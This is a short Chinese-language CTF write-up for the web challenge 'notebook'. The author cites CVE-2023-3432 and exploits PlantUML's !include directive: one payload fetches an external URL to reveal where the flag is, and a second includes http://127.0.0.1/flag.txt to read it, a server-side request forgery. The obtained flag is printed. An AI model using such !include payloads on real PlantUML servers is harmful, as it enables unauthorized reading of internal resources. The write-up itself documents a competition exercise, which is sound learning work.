---
title: "minivnctf"
date: "2026-08-19"
lastmod: 2026-08-19T16:53:57.086Z
slug: "minivnctf"
summary: ""
tags:
  - "VN"
categories:
draft: false
cover: ""
params:
  protected: false
---

id:lilym

方向:web

# 1.notebook

网上找到了CVE-2023-3432漏洞是关于plantuml的

首先使用了

```
@startuml
!include https://forum.butian.net
Alice -> Bob: Message
@enduml
```

得到了信息

```
生成失败: flag在http://127.0.0.1/flag.txt
```

然后直接

```
@startuml
!include http://127.0.0.1/flag.txt
Alice -> Bob: Message
@enduml
```

拿到flag

```
生成的图表
VNCTF{5$Rf?!_THl5_RE4I_BU6}
```

根据漏洞，利用了

```
!include
```

被允许加载http://开头的资源，这个漏洞的正则匹配缺陷使得可以执行敏感要求

